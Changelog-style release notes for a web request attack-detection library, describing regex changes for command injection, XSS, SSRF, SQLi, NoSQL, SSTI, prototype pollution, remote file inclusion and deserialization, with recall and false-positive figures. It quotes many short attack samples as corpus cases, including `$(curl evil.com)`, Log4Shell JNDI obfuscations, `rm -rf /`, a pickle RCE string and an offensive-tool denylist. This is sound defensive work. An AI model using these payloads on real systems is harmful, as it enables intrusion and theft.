- **Nested `wp-content/themes/<name>` and `inicio.html` probes now detected.** The `default|inicio|indice|localstart` recon pattern only matched at the top level (`\A/?` immediately before the word), so `/en/inicio.html` fell through: the nested `en/` segment sat where the anchor required the word itself. `/wp-content/themes/default` turned out to already be caught by the existing `wp-content` `cms_probing` pattern, whose suffix already tolerates an arbitrary trailing path, so it needed no pattern change, only a corpus pin. A new `recon` pattern accepts `inicio.html` (or `.htm`) at any nesting depth, matching only when the literal word is immediately followed by the extension, so a bare `/inicio` mention, nested or on its own line, still does not match; `/api/v1/namespaces/default` (bare, no extension) and `/api/v1/namespaces/default/pods` stay unflagged, and so does the multi-line Spanish-routes doc mentioning `/inicio` and `/indice` with no extension. `recon` recall on the pattern-layer benchmark rises from 22/22 to 23/23 detected (`cms_probing` rises from 9/36 to 10/37 on the new corpus pin alone); the benign corpus grows to 243 cases and stays at 0 false positives.
- **Prose that quotes an absolute-path or env-prefixed shell invocation after a semicolon, and a field whose entire value is such an invocation, are documented known false positives in `cmd_injection`.** An adversarial review of the two widenings above found they also match a shell invocation quoted inside ordinary prose, for example "First run setup; /bin/sh -c 'ls' to verify." The matched substring is character-identical to the attack shape those widenings must catch, so no regex tightening removes it without reopening the gap the widenings closed; telling a quoted invocation apart from a real one needs contextual evaluation, not regex shape. This surface is symmetric with the pre-existing bare-shell form (`; sh -c ...`), which has fired on the same prose shape in every released version and is pinned here as a control case. A second adversarial review found the same widened patterns also match a field whose entire value is a bare shell invocation spec, the Docker/K8s command or entrypoint override shape, for example "/bin/sh -c 'npm start'" or "/bin/bash -l" carried as a whole request body or query parameter. This is symmetric with the bare form (`sh -c 'npm start'`), which has matched via the same pattern in every released version, and `bash -c 'rm -rf /'` sits in the malicious corpus as a wanted detection of the identical shape, so a whole-value shell invocation stays a caught attack shape; an API that legitimately carries command specs needs route-level configuration, not a narrower pattern. The benign corpus grows to 253 cases and gains nine documented known false positives across both surfaces; the other 244 cases stay at zero.
- **`$(...)`/`${...}` command substitution now detected without a leading separator, and Log4Shell `${jndi:...}` is a dedicated, config-independent pattern, in `cmd_injection`.** Only `; $(id)`/`|${IFS}...`-style separator-prefixed substitution fired before this change; the far more common bare and glued shapes (`$(whoami)`, `$(cat /etc/passwd)`, `x$(curl evil.com)`, `foo$(whoami)bar`, `${IFS}`) matched nothing. A new unanchored `$(...)`/`${...}` candidate pattern reuses the glued-backtick discriminator's shape: a denylisted or implausible token (a path, a shell metacharacter, or one of the shell command names below) detects in every context; a bare single ambiguous token (`$(id)`, `${name}`) is context-gated to `query_param`/`url_path` only, the same collision the backtick discriminator already carries with the jQuery `$(id)`/`$('#x')` selector and the JS `${var}`/`${obj.prop}` template-literal shapes, both benign in a request body. A `$(...)`/`${...}` pair immediately quoted by a backtick (a markdown-style mention, `` `$(whoami)` ``) is exempt regardless of token content, mirroring how a plain backtick mention of a denylisted command was already exempt; without this, the pattern punched through the existing backtick-mention exemption for any denylisted word. Because the ambiguous-token ceiling is meaningless in `url_path` (`cmd_injection`'s own context set never included it, leaving that half of the backtick discriminator's own gate unreachable there), the new pattern carries its own, slightly wider context set so the gate is reachable in both of the contexts it names; `cmd_injection`'s shared context set and every other `cmd_injection` pattern are unchanged. Separately, `${jndi:ldap://...}`, `${jndi:rmi://...}`, `${jndi:dns://...}`, and the standard WAF-bypass obfuscations `${lower:j}ndi`, `${::-j}ndi`, and `${${lower:j}ndi:...}` are now a dedicated pattern with no contextual gate at all: there is no legitimate request content that contains a JNDI lookup expression. Verified none of the obfuscated forms are altered by `ContentPreprocessor.preprocess()` (no decode step touches `$`, `{`, `}`, `:`, or `-`), so no pattern needed `DETECTION_RAW_VIEW_PATTERN_SOURCES`.
- **The glued-backtick/dollar-substitution SQL-keyword exemption required only a strong SQL keyword (`SELECT`, `FROM`, `JOIN`, and so on) anywhere within the existing 40-character context window, so a keyword sprinkled anywhere nearby, not actually adjacent to the pair, silently exempted an otherwise-detected ambiguous token in `cmd_injection`.** `` x`id` JOIN accounts `` and `x$(id) JOIN accounts` both evaded detection in `query_param`/`url_path` this way even though the keyword sits three characters away with a space, not glued to the pair the way the legitimate no-space MySQL identifier shape (`` SELECT`id`FROM users ``) is. The exemption now requires the keyword to abut the pair with zero gap, on either side, within the same 40-character window; the legitimate glued shape (`` SELECT`id`FROM ``, `SELECT$(id)FROM`) still exempts, and the two bypasses above now detect in `query_param`.
- **Ten additional tool names join the shell-command denylist that drives the unambiguous branch of the glued-backtick/dollar-substitution discriminator:** `nmap`, `socat`, `msfconsole`, `msfvenom`, `certutil`, `bitsadmin`, `powershell`, `pwsh`, `mkfifo`, `aria2c`. Each is a tool name that can never plausibly be a column or identifier, so a glued mention (`` x`nmap` ``, `$(mkfifo /tmp/f)`) now detects in every context instead of only when accompanied by a chained separator or an already-denylisted neighbor. `cmd_injection` recall on the pattern-layer benchmark rises from 32/33 to 45/46 detected (the sole undetected case is the pre-existing, documented truncation-boundary gap); the end-to-end (`detect_penetration_attempt`) benchmark rises from 184/231 to 197/231 detected across all seven delivery mechanisms (`raw_body`, `form_body`, `json_body_nested`, `multipart_body`, `header`, `query_param`, `url_path`), both legacy and enhanced singletons. The benign corpus grows to 272 cases; the false-positive count on the pattern-layer (request-body-only) benchmark stays at the existing nine documented `cmd_injection` cases. The end-to-end benchmark, whose round-robin delivery mechanism can assign any benign case to any of the seven mechanisms including `query_param`/`url_path`, gains seven newly-documented known false positives with the same reason: the four jQuery/JS-template benign twins above, plus three pre-existing benign cases (`export PATH=${HOME}/bin`, a Makefile `$(CC)`/`$(CFLAGS)` mention, and a `${amount}` template-syntax sentence) that were always safe under the old separator-only pattern and are now, correctly, ambiguous-gated the same way; none of the seven is a new false positive, all are the discriminator's context-gate working as designed.
- **The `xss` event-handler pattern only matched a hardcoded enum of eleven handler names (`onerror`, `onload`, `onclick`, `onmouseover`, `onsubmit`, `onmouse*`, `onunload`, `onchange`, `onfocus`, `onblur`, `ondrag`), so every modern handler evaded it:** `ontoggle`, `onpointerdown`, `onanimationstart`, `onmousedown`, `onwheel`, and any other `on*` DOM event were undetected regardless of tag. The enum is replaced with `on\w+`, but scoped to require the HTML tag/attribute shape it always appears in (`<tag ... on\w+=value`) rather than a bare token match; an unscoped `on\w+=` collides with ordinary `key=value` text that happens to start with "on" (`one=1`, `only=5`, `condition=active`, `onboarding=complete`, `onward=next`), all of which stay unmatched with the tag-scoped version. `xss` recall on the pattern-layer benchmark rises from 14/14 to 19/19 detected; the benign corpus stays at 0 new false positives, including a new pin for a bare `on\w+=` shape outside any tag. That tag-scoping introduced its own recall regression: requiring `\s+` before the handler name misses every slash-separated bypass (`<svg/onload=alert(1)>`, `<img/onerror=alert(1)>`), a canonical WAF-evasion shape the old hardcoded enum used to catch. The separator now accepts whitespace or a slash (`[\s/]+`), with a same-position negative lookbehind (`(?<!=)(?<!=")(?<!=')`) barring a slash that is itself the first character of an attribute value, so `<svg/onload=`, `<img/onerror=`, and `<img src=x/onerror=` (slash between attributes) still match while `<a href="/onboarding">`, `<a href=/onboarding=x>`, and `<a href="/only=5">` (a slash-prefixed word inside a href/src value, quoted or not) do not. `xss` recall on the pattern-layer benchmark rises from 19/19 to 23/23 detected; the benign corpus stays at 0 new false positives (still the 9 pre-existing `cmd_injection` cases), including three new pins for slash-prefixed href/src path values that start with an "on" word.
- **The named-host SSRF pattern's `(?:^|\s|/)` boundary broke on a userinfo segment preceding the host, so `http://x@localhost/` and `http://attacker@metadata.google.internal/` were undetected** even though the sibling numeric-IP SSRF pattern already tolerates userinfo (`http://x@127.0.0.1/` detects). An optional userinfo group is now allowed between the boundary and the denylisted host token, but only when it immediately follows a `://` scheme separator (a lookbehind), so a bare `root@localhost`-style email mention with no URL scheme still does not match while a real `scheme://user@host` URL does. `ssrf` recall on the pattern-layer benchmark rises from 24/24 to 26/26 detected; the benign corpus stays at 0 new false positives, including new pins for `root@localhost` prose and a plain `user@example.com`.
- **The bare-ambiguous dollar-substitution branch, dropped for false-positiving on four benign shapes, is restored: a single-token `$(id)`/`${IFS}`-style command substitution is detected again in `query_param`/`url_path`, `cmd_injection`.** A prior pass found `_dollar_substitution_pair_is_injection`'s ambiguous fallback -- the branch that context-gates a bare, non-denylisted single token like `$(id)` or `${name}` to `query_param`/`url_path`, the same collision the glued-backtick discriminator already carries -- false-positived on `export PATH=${HOME}/bin`, a Makefile `$(CC)`/`$(CFLAGS)` mention, and a `${amount}` template sentence, and dropped the branch rather than discriminate the false positives away, undetecting every bare `$(X)`/`${X}` shape not already on the strong shell-command denylist: `$(id)`, `$(uptime)`, `$(w)`, `$(who)`, `$(groups)`, `$(set)` all went undetected as query-string or path values. Three discriminator variants were measured against the false positives and against a synthetic 22-shape attack catch-set before a ruling: token-identity (flag only a denylisted-or-extended shell-command name) cuts the false positives to one but only catches 9/22 of the catch-set (misses any unrecognised command and every `${ENV_VAR}`-shaped token entirely); case/shape (flag anything not all-caps) cuts them to three at 18/22; the aggressive branch (flag any non-implausible single token, the original pre-drop behavior) catches all 22/22 at five false positives. Ruling: restore the aggressive branch outright and disclose the false positives rather than trade away recall against an arbitrary-token attacker who is not going to spell a probe in all caps. The five are now named, pinned corpus cases at both the pattern layer (`test_detection_benchmark.py`) and the end-to-end layer (`test_detect_penetration_attempt_benchmark.py`), detected in both `query_param` and `url_path`, disclosed rather than silently absorbed: the jQuery `$(id)`/`$('#x')` selector and the shell-doc/Makefile/template variable-expansion shapes above are all character-identical to the attack shape as raw query-string or path-segment values, and stay correctly benign in `request_body`, where the branch never fires. Restoring the branch also incidentally re-detects the obfuscated Log4Shell forms (`${lower:j}ndi`, `${::-j}ndi`, the nested full exploit) in `url_path`, which the dedicated JNDI pattern's own context set has never covered there; those three are now separately pinned as dedicated corpus cases at both layers too, so they cannot silently regress if the dollar pattern is ever tuned again, and the dedicated pattern's own context set gains `url_path` in a follow-up fix so Log4Shell-at-`url_path` is caught by the pattern built for it rather than depending on the dollar discriminator's incidental overlap. `cmd_injection` recall against the new bare-command-name corpus rises from 6/18 to 18/18 (query_param + url_path combined) with zero MALICIOUS_CORPUS regression at its existing `request_body` baseline (217/251, unchanged across every variant measured, since the ambiguous branch never reaches `request_body`).
- Two benign corpus entries flagged by the backtick discriminator's `url_path` branch (`` header`x-forwarded-for`value ``, `` config`well-known`here ``, a pre-existing, already-accepted tradeoff pinned for `query_param` since Phase 0 and measured to also apply to `url_path` once a prior ruling made that branch reachable there) newly landed on `query_param`/`url_path` in the end-to-end benchmark's round-robin delivery after later corpus growth shifted their assigned index; they are now pinned as documented known false positives at that layer too, matching the tradeoff already accepted for the same shapes elsewhere.
- **Explicit-scheme RFI (`?page=http://attacker.com/shell.php`-shaped param values) is now a dedicated `file_inclusion` pattern.** Neither existing `file_inclusion` pattern covered it: the wrapper pattern only matches PHP-specific stream wrappers (`php://`, `data://`, `zip://`, `phar://`, and so on), and the protocol-relative pattern's `(?<!:)` lookbehind (see the entry above) deliberately excludes anything with a scheme, so a plain `http://`/`https://`/`ftp://` URL carried as a request-parameter value, the classic RFI delivery shape, went through undetected regardless of what it pointed at. A new pattern requires an explicit scheme immediately after a param-value `=`, with the final path segment ending in one of the RFI executable/includable target extensions (`.php`, `.php3`-`.php5`, `.phtml`, `.phar`, `.jsp`, `.asp`, `.aspx`, `.cgi`, `.pl`, `.py`, `.sh`, `.txt`, `.inc`); requiring the extension to sit in a path segment rather than the bare host keeps a vanity ccTLD domain used with no path (`url=https://example.sh`, `next=https://onet.pl`) unmatched. `file_inclusion` recall on the pattern-layer benchmark rises from 8/8 to 16/16 detected. A genuine param-value link to a real remote file sharing one of those extensions is character-identical to the RFI payload shape and cannot be told apart from it by extension alone: a raw-doc download link (`README.txt`, `readme.txt`, `terms.txt`) and a curl-pipe installer or legacy cgi-bin link (`install.sh`, `search.cgi`) all fire the same way `?file=https://evil.example/backdoor.txt` does. An app that legitimately serves such download or installer links needs route-level allowlisting, not a narrower pattern that would lose recall on the backdoor.txt/backdoor.pl-shaped payloads this pattern exists to catch. The benign corpus grows to 291 cases and gains six documented known false positives, disclosed at both the pattern layer (`test_detection_benchmark.py`) and the end-to-end layer (`test_detect_penetration_attempt_benchmark.py`, pinned across every delivery mechanism the pattern's own context set reaches: `raw_body`, `form_body`, `json_body_nested`, `multipart_body`, `query_param`, `url_path`, and correctly absent from `header`, which that context set never covers); the other 285 cases stay at zero.
- **`{{ }}` and `#{ }` template delimiters gain a shape-gated `template` pattern, closing the gap the existing keyword-gated pair (`{{...system|exec|popen|eval|require|include...}}`, `{%...%}`) left for keyword-free SSTI: `{{7*7}}`, `{{7*'7'}}`, `{{config.items()}}`, and `#{7*7}` all went undetected before this change even though the sibling `${...}` gate already catches the identical shape.** The new pair mirrors `${...}`'s existing alternation exactly (an OGNL-style `@bean@` token, a bare function-call shape `word(`, or a digit-operator-digit arithmetic run), so any `{{ }}`/`#{ }` expression delivered as a request value that contains a function call or arithmetic is now treated as SSTI; `${...}` itself is unchanged. The arithmetic branch is quote-tolerant (an optional `'`/`"` may wrap either operand), closing a second gap the plain `${...}` gate still has: `{{7*'7'}}`, `{{'7'*7}}`, and `{{"5"+"5"}}`, the quoted-operand probes an attacker uses to distinguish a template engine's numeric-vs-string coercion, went undetected by the unquoted-only arithmetic shape. The `#{ }` pattern additionally needed registering in `DETECTION_RAW_VIEW_PATTERN_SOURCES`: the enhanced-mode content preprocessor unconditionally rewrites every literal `#` to a space (it treats `#` as a SQL/shell line-comment marker), so `#{7*7}` silently became `" {7*7}"` before pattern matching ever ran, and the gate could never fire end-to-end in production despite matching in isolation; the pattern is now also checked against the raw, non-comment-stripped view, the same mechanism the LDAP-null-byte and SQLi-comment-terminator patterns already rely on for the same reason. `template` recall on the pattern-layer benchmark rises from 6/6 to 13/13 detected. The quote-tolerant arithmetic branch is also character-identical to a hyphen-delimited date sitting inside template-looking braces (`{{ 2024-01-02 }}`, `#{2024-12-31}` parse as digit-minus-digit subtraction), and the function-call branch is character-identical to a template's own legitimate filter or method-call syntax (`{{ format(x) }}`, a Jinja `{{ item.price | round(2) }}` filter, a Ruby `#{ helper.format(value) }` helper call, a JS-style `{{ cart.items.map(item => item.price) }}` arrow callback): any `{{ }}`/`#{ }` value containing a function call or arithmetic is treated as SSTI, and an app that legitimately accepts raw template source or braced dates as a request value needs route-level allowlisting, not a narrower pattern that would lose recall on the `{{7*7}}`/`{{7*'7'}}`/`#{7*7}` shapes this gate exists to catch. A bare-variable reference (`{{ user.name }}`, `{{ title }}`, `#{brandColor}`, `#{user.name}`) stays correctly benign, since it contains neither a call nor an arithmetic shape. The benign corpus grows to 302 cases and gains six documented known false positives (two date-in-braces, four call/filter-syntax), disclosed at both the pattern layer and the end-to-end layer, pinned across every delivery mechanism the pattern's own context set reaches (`raw_body`, `form_body`, `json_body_nested`, `multipart_body`, `query_param`, and correctly absent from `header`/`url_path`, which that context set never covers); the other 296 cases stay at zero.
- **The two stacked-query `sqli` patterns only covered a fixed verb list each (`DROP|TRUNCATE|ALTER` for DDL, `INSERT INTO|UPDATE...SET|DELETE FROM` for DML), so `1; SELECT name FROM users`, `1; CREATE TABLE evil (a int)`, and `1; REPLACE INTO t VALUES(1)` all went undetected after a `;`, and no pattern at all covered `EXEC`/`EXECUTE` of a SQL Server system stored procedure.** `CREATE` joins the DDL verb alternation (`;\s*(?:DROP|TRUNCATE|ALTER|CREATE)\s+(?:TABLE|DATABASE|SCHEMA)`); a stacked `SELECT...FROM` and `REPLACE INTO` join the DML alternation (`;\s*(?:INSERT\s+INTO|UPDATE\s+\w+\s+SET|DELETE\s+FROM|SELECT\b[^;]*?\bFROM\b|REPLACE\s+INTO)`); and a new dedicated pattern, `\bEXEC(?:UTE)?\s+(?:xp_\w+|sp_\w+)`, catches `EXEC xp_cmdshell(...)`, `EXECUTE sp_configure`, `EXEC sp_executesql(...)`, and any other `xp_`/`sp_`-prefixed system proc, standalone or stacked after a `;`. An earlier version of the EXEC pattern also accepted a blanket call-shape catch-all (`|\w+\s*\(`) so any word-then-paren would qualify; an adversarial review found that branch false-positives on ordinary prose like "just execute report() from the admin console" or "execute cleanup()" (any sentence pairing the word "execute" with a nearby function call), so the call-shape branch was dropped and the pattern scoped to the `xp_`/`sp_` system-proc-name prefix only, which zeroes that false positive while keeping every `xp_`/`sp_` proc name caught. `sqli` recall on the pattern-layer benchmark rises from 19/19 to 27/27 detected, via eight new corpus cases: the three new shapes above, the two EXEC cases, and three previously-undetected stacked `INSERT`/`UPDATE`/`DELETE` regression pins that had never been in the corpus despite already matching. The `;`-anchored shape of the whole stacked-query family is a documented class-level false positive, disclosed rather than corpus-pinned: a request or param value that literally contains `; <verb> ... <characteristic clause>` for any of SELECT..FROM, INSERT INTO, UPDATE..SET, DELETE FROM, REPLACE INTO, or the DROP/TRUNCATE/ALTER/CREATE DDL set reads as stacked SQLi regardless of surrounding prose, for example a support article or style guide value quoting "; SELECT price FROM catalog" or "; UPDATE users SET status='active'" as a worked example; this is symmetric with the pre-existing stacked DROP/INSERT/UPDATE/DELETE patterns, which have carried the identical `;`-anchored tradeoff since they first shipped. An app that legitimately carries such literal SQL-doc content as a value needs route-level allowlisting, not a narrower pattern that would lose recall on the stacked-query payload shapes this family exists to catch. `EXEC <bareword-or-qualified-custom-proc>` (an app-defined procedure call sharing no name overlap with the `xp_`/`sp_` system namespace, e.g. `EXEC dbo.Proc()`) and stacked `; MERGE INTO ...` are out of scope and stay undetected, both stated non-goals rather than silent gaps. The benign corpus grows to 315 cases with zero new pinned false positives (the existing 21 are unchanged); measured against the full benign corpus, the sqli-attributed false-positive count is 0.
- **A new `nosql` pattern (`\[\$op\]`) detects value/body-delivered NoSQL operator-bracket injection: `username[$ne]=admin`, `filter[$gt]=100`, `search[$regex]=.*`, `x[$where]=sleep(1)`.** All four existing `nosql` patterns require the JSON `{`/`"` shape (`{"$ne": ...}`, `"$where": ...`), so a MongoDB operator delivered as a bracketed key inside a scanned value or body, the shape a `qs`/Express-style query parser expands into `{$ne: "admin"}`, matched none of them. The new pattern matches a literal `[$op]` token (`where`, `gt`, `gte`, `lt`, `lte`, `ne`, `eq`, `regex`, `in`, `nin`, `nor`, `and`, `or`, `not`, `all`, `size`, `exists`, `type`, `mod`, `options`, `expr`, `function`, `elemMatch`) anywhere in a scanned value; a bare bracket carrying no operator (`arr[]=1`, `obj[key]=val`, `order[0]=asc`, `filter[status]=active`, `items[2][name]=x`) still does not match. `nosql` recall on the pattern-layer benchmark rises from 6/6 to 10/10 detected; the benign corpus grows to 320 cases and stays at 0 new false positives, the five bare-bracket shapes above pinned and clean. A `[$op]` token is character-identical whether it is genuine NoSQL injection or a legitimate operator-query-API convention some REST backends accept directly on the wire (`price[$gt]=100`, `sort[$in]=a,b`, `filter[$ne]=null`); this is a documented class-level false positive, disclosed rather than corpus-pinned, symmetric with the `;`-anchored stacked-query tradeoff above. An app that legitimately exposes a Mongo-operator-style query API needs route-level allowlisting for those parameters, not a narrower pattern that would lose recall on the canonical `[$ne]` auth-bypass shape this pattern exists to catch. Separately documented, not yet closed: the canonical real-world delivery of this attack puts the `[$op]` token in the query-parameter name, not its value (`?username[$ne]=admin`, the `qs`/Express shape), and `detect_penetration_attempt`'s query-parameter scan (`_scan_query_params` in `guard_core/utils.py`) currently feeds only parameter values to the detection engine, never parameter names, so that exact delivery shape is not yet detected end-to-end regardless of pattern; a companion change to scan parameter names is planned next.
- **`proto_pollution` extended: the existing pattern only caught the literal `prototype`-specific chain (`__proto__["prototype"]`, `constructor.prototype`, a quoted `"__proto__":` JSON key); a new pattern catches arbitrary-key pollution through the same two roots.** `__proto__[isAdmin]=true` and `__proto__.polluted=1` (any key, not just `prototype`) and the unquoted `constructor[prototype][isAdmin]=true` bracket chain all went undetected, since the original pattern required either a quoted `"prototype"` literal in brackets/dot access or a JSON `"__proto__":` key specifically. The new pattern matches `__proto__[` / `__proto__.` / `[__proto__]` (any key that follows) and the `constructor[prototype]` / `constructor.prototype` / `[constructor][prototype]` chain (quotes now optional); it does not match bare `constructor` or `prototype` alone. `proto_pollution` recall on the pattern-layer benchmark rises from 5/5 to 8/8 detected; the benign corpus grows to 323 cases and stays at 0 new false positives, `a.constructor.name`, bare `constructor`, and bare `prototype` pinned and clean. An `a.constructor.prototype`-shaped value is not a new false positive here: the pre-existing pattern already treats any `constructor.prototype` occurrence as malicious (`proto_pollution_prototype_dot_access` has been a pinned malicious case since this category shipped), so a benign reflection of that exact shape was already a known, disclosed tradeoff, unchanged by this widening. Same param-name blind spot as the nosql commit above: `?__proto__[isAdmin]=true` (bracket in the query-parameter name, not its value) is not yet detected end-to-end for the same reason, `_scan_query_params` scans values only, and is covered by the same planned companion pipeline change.
- **The companion pipeline change planned by the two entries above now ships: request parameter NAMES are scanned for injection patterns, not just their values, closing an all-category detection bypass in every one of the six name-bearing sites in `guard_core/utils.py`.** `_scan_query_params`, `_scan_headers`, `_scan_json_value` (JSON body keys), `_scan_form_body`, `_scan_multipart_body`, and the embedded-JSON-key path inside `_check_json_fields` all fed a component's NAME only to exclusion checks and log labels, never to the detection engine, so `?username[$ne]=admin`, `?__proto__[isAdmin]=true`, a JSON body key `"1;DROP TABLE x"`, or a multipart field named `__proto__[x]` evaded detection at every category regardless of value content, in every version this scanning path has shipped. A new shared helper, `_scan_component_name`, runs the same regex-pattern-plus-preprocessing pipeline already used for values, against the name string alone (not a reconstructed `name=value`), scoped to the same detection context each site's value-scan already uses (`query_param`, `header`, `request_body`), so tuning stays a single point across all six call sites; each site checks its own existing exclusion set first, so an excluded parameter, body field, or header still skips both its name and its value. Header names are the one sensitive case, preserving the GHSA-motivated excluded-header design exactly: an excluded header's name gets only the Log4Shell JNDI shield (`_check_always_scan_header`), the same treatment its value already gets, never the full pattern set; a non-excluded header's name gets the full scan. Name-scanning skips the embedded-JSON-value parse attempt values get (a parameter name is never a JSON document, so a `json.loads()` attempt against it is pure waste, gated by a new `scan_embedded_json` flag defaulting `True` for values and set `False` only for names); regex-pattern coverage, preprocessing, and recall are unaffected; only the wasted parse attempt is skipped. Verified against a standalone 315-case benign-name sweep (realistic REST names -- `id`, `user_id`, `page`, `filter[status]`, `tags[]`, `data[items][0][price]` -- and 56 category-keyword names such as `select`, `script`, `constructor`, `template` -- across the query/JSON/form/multipart channels) plus a 42-case header-name sweep (common non-excluded headers and all default-excluded headers): zero new false positives, and the default-excluded-header jndi-shield-only path is unchanged. Not yet folded into the corpus-driven benchmarks (`test_detection_benchmark.py`, `test_detect_penetration_attempt_benchmark.py`); covered instead by a dedicated unit-test file, `tests/test_utils/test_param_name_scan.py`. Scanning names doubles the number of detection passes on request components that carry one (query params, headers, and body field names), a measured ~1.8-1.9x per-request cost on a synthetic name-bearing batch; production wall-time is effectively unchanged in absolute terms, since names are short strings and this is the coverage the change is meant to add. **New disclosed false-positive class, symmetric with the `nosql` bracket-operator tradeoff already documented above:** now that names are scanned, a Mongo-operator-style query parameter NAME (`price[$gt]=100`, `sort[$in]=a,b`, `filter[$ne]=null`, the same REST convention the value-delivered tradeoff already covers) is character-identical to the `[$op]` injection shape and fires `nosql`; an app that legitimately exposes such an operator-query API needs route-level allowlisting (`excluded_detection_params`) for those parameter names, not a narrower pattern that would lose recall on the canonical `?username[$ne]=admin` auth-bypass shape this change exists to catch.

- **Structured JSON body operator KEYS now detected in `nosql`, closing a bypass the value- and name-scanning changes above did not reach: `{"username":{"$ne":null}}`, `{"$ne":1}`, `{"$gt":"x"}`, and a nested `{"a":{"$where":"this.x==1"}}` all evaded detection at every depth.** A valid JSON dict/list request body is walked structurally by `_scan_json_value` (`guard_core/utils.py`), which recurses into nested dicts and scans each key and leaf value in isolation; `_scan_request_body` returns that structured-walk result directly, short-circuiting before the raw-text blob-scan a non-JSON body would otherwise get. A bare Mongo operator delivered as a JSON dict KEY, rather than a bracketed name or a value, matched no existing pattern: the `[$op]` bracket pattern above needs literal brackets, and the `"$op":` quoted-string patterns need the literal quote characters, neither of which survives once the body is `json.loads()`-ed into a Python key. A new operator-key check now runs inside `_scan_json_value`'s dict branch, after the existing `excluded_body_fields` exclusion (an excluded field still skips both name and value), so it covers every nesting depth for free: a key matching `^\$(?:ne|gt|gte|lt|lte|eq|in|nin|nor|and|or|not|all|size|exists|type|mod|options|where|regex|expr|function|elemMatch)$` flags `nosql` immediately, without needing to reach the leaf value at all. The alternation is deliberately scoped to exclude JSON-Schema's own `$`-prefixed vocabulary (`$schema`, `$ref`, `$id`, `$defs`, `$anchor`, `$comment`), verified clean, alongside ordinary and arbitrarily-nested benign JSON (`{"price":100,"name":"x"}`, `{"a":{"b":{"c":{"d":1}}}}`). Non-goal, ruled explicitly: blob-scanning the raw JSON body instead of walking it structurally was considered and rejected, since it would miss scalar-value operators nested under unrelated keys, reopen the false-positive surface the structured walk exists to narrow, and duplicate work the leaf-value scan already does. **New disclosed false-positive class, the same shape as the `[$op]` bracket and parameter-name tradeoffs already documented above:** a legitimate Mongo-operator-query JSON body (`{"price":{"$gt":100}}`, `{"age":{"$ne":null}}`) is character-identical to the attack shape and fires `nosql`; an app that legitimately exposes such an operator-query JSON API needs route-level allowlisting (`excluded_detection_body_fields`) for those keys, not a narrower pattern that would lose recall on the canonical `{"username":{"$ne":null}}` auth-bypass shape this change exists to catch. Verified end-to-end (`detect_penetration_attempt`, enhanced/production config, JSON content-type) for all five positive shapes, the nested case included, and for zero false positives across the JSON-Schema and ordinary/nested benign corpus above. Not delivered through the corpus-driven benchmarks (`test_detection_benchmark.py`, `test_detect_penetration_attempt_benchmark.py`): investigated and found infeasible without restructuring the harness, since every `MaliciousCase`/`BenignCase` payload is a plain string and the corpus's only JSON delivery mechanism (`json_body_nested`) always wraps that string as a leaf VALUE (`{"outer":{"field": payload}}`), never as a parsed dict KEY; the embedded-JSON-string reparse path (`_try_check_json_value`) is also explicitly skipped for `request_body` context, so no existing or cheaply-added mechanism can deliver an operator as an actual dict key without a mechanism-model change that would also shift every other category's pinned round-robin mechanism assignment. Covered instead by a dedicated unit-test file, `tests/test_utils/test_structured_json_nosql.py` (and its generated sync mirror), the same precedent set by the parameter-name change above.

- **A new `deserialization` detection category (CWE-502) catches untrusted serialized payloads in their base64 wire form across five languages: Java (`rO0AB`), Python pickle (`gASV`/`gAWV`, the protocol-4/5 frame-opcode marker, plus the `c__builtin__`/`csubprocess`/`cposix`/`cos\n` GLOBAL-opcode dangerous-module text markers), PHP object-serialize (`O:\d+:"`), .NET `BinaryFormatter` (`AAEAAAD`), and Ruby `Marshal` (`BAh[Jv]`).** Four of the five binary-magic markers, plus `cos\n`, needed registering in `DETECTION_RAW_VIEW_PATTERN_SOURCES` (`guard_core/handlers/suspatterns_handler.py`): measured against realistic-length payloads (200-400 byte serialized objects matching real gadget-chain composition, not toy headers), `ContentPreprocessor._decode_base64_candidates` (`guard_core/detection_engine/preprocessor.py`) base64-decodes any candidate blob whose decoded printable-ASCII ratio clears 0.5 and replacement-char ratio stays under 0.2, and a realistic class/type-name-heavy payload clears that bar every time, silently destroying the base64 marker text before the normal-path pattern ever runs; `cos\n` fails for a different reason, `remove_excessive_whitespace` collapses its literal newline to a space before the normal-path view is built. Both are checked against the pre-decode raw view instead, the same mechanism the `#{ }` SSTI pattern already relies on. Raw serialized BYTES were considered and ruled out as structurally unreachable, not merely undesirable: `detect_penetration_attempt`'s body read (`guard_core/utils.py`) does a strict `body_bytes.decode()`, and the Java/.NET/pickle magic bytes are invalid UTF-8, so the decode raises and the entire body scan is skipped before any pattern runs; only the base64-encoded wire form is a reachable delivery vector, so no byte-form pattern was added, it would be dead code. Because the pattern list compiles under `re.IGNORECASE`, all four binary-magic markers are wrapped in a scoped `(?-i:...)` case-sensitive guard: unguarded, `gA[SW]V` and `BAh[Jv]` measured 3/2,000,000 and 7/2,000,000 collisions against random base64; guarded, 0-1/5,000,000, since a wrong-case base64 character is a mathematically different byte, never the real magic. Ruby's magic is `\x04\x08`, a 16-bit prefix that only base64-encodes cleanly to a collision-prone 3-character token (`BAg`, measured 11/2,000,000 random-base64 collisions); it is extended to the full 3-byte, 4-character encoding of the magic plus the Marshal top-level-type byte for the two dominant real-world gadget-chain shapes, object (`o`) and ivar-wrapped (`I`), giving `BAh[Jv]` at 1/5,000,000. A bare `__reduce__` text marker was measured and dropped: 9/10 false positives on ordinary Python pickle-customization documentation and Stack-Overflow-style text (`define a __reduce__ method`, `object.__reduce__()`); pickle detection is already fully covered by the `gASV`/`gAWV` base64 markers and the GLOBAL-opcode text markers. `deserialization` recall on the pattern-layer benchmark is 6/6 detected across all five languages: a real `pickle.dumps(..., protocol=4)` payload, a real 17-byte NRBF `.NET` header plus an `ObjectDataProvider` type name, a hand-built Java `HashMap` serialization stream, a `Gem::Requirement`-shaped Ruby `Marshal` stream, a PHP `stdClass` object-injection string, and the classic hand-crafted `cos\nsystem\n(S'id'\ntR.` pickle RCE payload, which also fires the pre-existing `cmd_injection` pattern; the benign corpus (323 cases) gains zero new false positives.

- **`deserialization` closes four confirmed false negatives an adversarial review found in the category above, all still 0 new false positives on the 323-case benign corpus.** Python pickle's GLOBAL opcode was only matched for four hardcoded dangerous modules (`os`, `__builtin__`, `subprocess`, `posix`); a new generic marker matches the opcode's actual wire shape for ANY module (`(?m)^c<dotted-module>\n<callable>\n`, raw-view, since `remove_excessive_whitespace` collapses the opcode's literal newlines on the normal-path view), closing gadgets built on `shutil.rmtree`, `importlib.import_module`, and any other module a real chain reaches.
